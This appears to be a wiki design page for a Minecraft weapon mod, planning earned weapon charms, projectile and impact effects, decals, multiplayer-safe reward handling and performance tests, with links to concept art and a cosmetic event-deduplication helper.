# Earned weapon charms and effect customization

**Requested goal, 18 October 2026. Planned, not implemented.** Add collectible, attachable weapon charms inspired by the owner's Charmsy × Punchy reference, plus expressive finisher/death, projectile, tracer and impact customization inspired by COD and Path of Exile. Study those references before claiming a compatible implementation.

## Earn, collect, equip

Earn charms through achievements, boss victories, exploration and weapon challenges. Show the unlock condition, progress, source, rarity, appearance and exact bonus before equipping. Support collection browsing, search, previews, favorites and accessible names. A boss trophy should evoke its source and be memorable in first person.

Each equipped charm improves the weapon in a declared way. Possible improvements include resource efficiency, recovery, handling, capacity, sustained-fire comfort or an eligible special effect. These are examples awaiting design and testing, not promised current behavior. Store its stable identifier and upgrade state on the weapon, resolve its effects with all attachments, and show the resulting values. Define slot count, duplicate stacking and compatible weapon families explicitly. Cosmetics cannot silently grant an undocumented advantage.

## Example original AoA-inspired charm concepts

- **Ghastly Lantern:** a tiny suspended soul lantern; Spirit-cost efficiency on eligible Spirit-consuming weapons.
- **Baron's Pennant:** animated miniature crimson naval pennant; steadier recovery for heavy weapons such as Baronator.
- **Rotary Heart:** miniature spinning industrial core; improved sustained-fire handling for supported rotary weapons.
- **Realm Pathfinder:** a small orbiting realmstone ornament; a dimension-themed bonus whose condition and actual effect must be specified before release.
- **Boss Echo:** a boss-specific collectible silhouette, with one transferable but explicitly adapted special effect. No automatic copying of arbitrary mob AI into a projectile.

These are proposed original charms, not claims that those items already exist in AoA. Their unlock encounters must be matched to real version-specific content.

## Separate customization channels

| Channel | Desired customization | Gameplay contract |
|---|---|---|
| Projectile appearance | Soul discs, spectral bolts, realm-themed forms and compatible skins | If only cosmetic, preserve actual trajectory/collision. If shape or behavior changes, declare a functional conversion |
| Tracer | Color, trail style, runes, ghost ribbons, intensity | Bounded lifetime and count; no persistent trails after unload; readable firing direction |
| Impact | Sparks, soul blooms, elemental bursts, decals and sounds | One accepted hit drives the event; visuals do not accidentally apply damage twice |
| Defeat/death effect | Dissolve, spectral release, realm-colored burst or stylized defeat flourish | Trigger only after an authoritative defeat; preserve loot, experience, quests and other mods' death hooks |
| Finisher | Optional cinematic or short combat flourish | Eligibility, consent/options for multiplayer, interruption and camera ownership require explicit design; never trap the player in a broken animation |
| Charm | Visible collectible with a real listed bonus | Saved attachment state, tooltip, resolved statistics and server behavior agree |

Allow previewing and mixing supported channels. A loadout can have a favorite tracer and impact independently of its skin. Supply clear compatibility messages when a combination is not supported rather than silently dropping an effect.

## QA and performance acceptance

### Stickers, animated decals and custom emblems

Owner-added requirement: static, animated and glowing stickers, plus custom sticker/emblem designs. Include placement, scale, rotation, layering, tint, opacity, glow intensity, undo/redo and reusable saved layouts. Earn designs through gameplay and combine them with skins and charms. Supply weapon-specific valid surfaces and a preview across firing, aiming and reloading; stickers must follow the correct moving part and not float between attachment swaps.

Custom imports must be validated image data, with explicit size, resolution, frame-count and animation-duration limits. Never execute embedded scripts or fetch arbitrary remote images during rendering. Use stable asset hashes, cached decoded textures and a documented fallback when a multiplayer client lacks an asset. Custom artwork sharing is opt-in under server rules; hidden remote tracking URLs are not an image format.

Support emissive/glowing materials without requiring each sticker to become a dynamic world light. Provide capped brightness, reduced-flash mode, distance/detail limits and a static animation fallback. Reuse texture atlases/material batches where appropriate and measure draw calls, memory and frame time. Preserve gameplay-identifying silhouettes and sights; a decal does not secretly change damage.

When an attachment is removed, preserve its saved decal layout for later reinstallation rather than losing the player's design. Define precedence between skin materials, decals, charm visuals and reactive overlays, and preview conflicts clearly. Test UV seams, mirrored surfaces, normal direction, z-fighting, transparent layers, color accessibility and every animation.

- Preserve original loot and kill credit; test boss phases, multipart entities, simultaneous hits, disconnects and duplicate network events.
- Grant rewards once under the declared unlock rules; prevent duplicate claims caused by retries or reloads.
- Charm swing must clear hands, magazines, sights and moving parts across every animation and attachment combination.
- Use cached unlock/attachment data and incremental updates, not repeated whole-mod scans or per-frame achievement polling.
- Budget particles, lights, trails, sounds and decals; include low-flash, reduced-motion and effect-density options without changing gameplay.
- Verify distant-player culling, chunk unload, weapon swaps, pause, death/respawn, server restart and save migration.
- Test TaCZ and AoA resource adapters plus intended combat-mod interactions before marking compatibility as supported.
- Publish actual measurements for baseline versus effects enabled. Zero performance regression remains a goal, not an unmeasured claim.

## Delivery checklist

- [ ] Inspect Charmsy × Punchy actual source/release and license; document exact identity/version.
- [ ] Establish charm sockets and animation clearances for each weapon family.
- [ ] Implement collection/unlock records and server-authoritative reward grants.
- [ ] Implement functional bonus resolution and full tooltip comparisons.
- [ ] Implement independent visual channels and workbench previews.
- [ ] Add original charm and effect concept sheets while retaining every previous iteration.
- [ ] Run actual game tests, multiplayer tests and performance comparisons.

[Alternate barrels and skins](Alternate-Barrels-and-Skins) · [Functional upgrades](Functional-Weapon-Upgrades) · [Weapon profile standard](Weapon-Profile-Standard)

## Original concept exploration

![Original charm and decal concepts](https://raw.githubusercontent.com/Herbertofury/Advent-of-Ascension/main/docs/charms-and-decals-concepts-v1.png)

Six original collectible silhouettes and decal/animation/glow directions. Concept art does not prove grip clearance: the illustrated hanging pennant still needs full movement and reload clearance tests on the actual model.

[Actual Charmsy release study](Charmsy-Direct-Study) records the inspected pack separately from our proposed gameplay.


## Branch-aware cosmetic event identity

An original [Java 17 presentation helper](https://raw.githubusercontent.com/Herbertofury/Advent-of-Ascension/main/docs/impact-visual-ledger-v1.zip) now distinguishes world generation, actor, weapon instance, burst, pellet, impact ordinal and the weapon/projectile impact branch. [Pure-core test receipt](https://raw.githubusercontent.com/Herbertofury/Advent-of-Ascension/main/docs/impact-visual-ledger-v1-tests.json).

This matters for Discharge Shotgun's two-stage entity-hit path: a burst-only duplicate key could suppress distinct intended effects. The tests preserve eight branch events across four pellets, reject repeated keys and exercise separate actors/weapons, bounded eviction and world resets.

This is a **finite cosmetic dispatch window**, not server damage validation or permanent replay prevention. Old keys can be accepted after eviction. Invoke it once at the logical branch-event boundary and fan out to the configured effects afterward; do not call it independently for each particle, camera or shader pass. Native hook placement, trusted event IDs, views, late packets, settings and frame-time behavior still require integration tests.


## Second original collectible sheet

![Six original Ascension charm proposals](https://raw.githubusercontent.com/Herbertofury/Advent-of-Ascension/main/docs/ascension-charms-concepts-v2.png)

These six additional designs expand the collection without replacing the earlier sheet. They are original proposals, not released AoA items or republished Charmsy assets. The chain rings and decorative silhouettes still require actual mesh, socket and animation-clearance tests.

| Charm | Suggested role | Unlock direction, still to specify |
|---|---|---|
| Soul Lantern | Bounded Spirit-cost efficiency on eligible weapons; maintain a nonzero resource floor | Spirit-weapon mastery |
| Storm Seal | Modest focus-settle improvement where the weapon has an explicit focus system | Accuracy/focus challenge |
| Crimson Capacitor | Supported post-burst recovery improvement; preserve Discharge's distinct impact branches | Discharge mastery |
| Boulder Knot | Grounded handling stability with a declared mobility tradeoff | Grounded heavy-weapon challenge |
| Mycelium Medallion | Limited collection convenience for eligible owned ammunition pickups | Exploration/collection achievement |
| Clockwork Core | Supported equip/recovery benefit; reload benefit only in actual magazine modes | Mechanical-weapon mastery |

These are candidate mechanics, not balanced numbers or implemented perks. Match unlocks to real version-specific achievements/encounters before release; the artwork does not authorize inventing canonical boss drops. Soul Lantern is also a visual alternative to the earlier Ghastly Lantern idea; settle stable identities before implementing duplicate collectible entries.

The menu must show the exact resulting bonus, eligible modes, stacking rule and any tradeoff. Test duplicate reward events, equip/unequip, swapping variants, full inventories, resource floors and save/reload. A no-swing/reduced-effects option must preserve the same earned gameplay benefit.

[Machine-readable design proposals](https://github.com/Herbertofury/Advent-of-Ascension/blob/main/docs/earned-charms-design-v2.json). All native gameplay and artistic acceptance gates remain open.
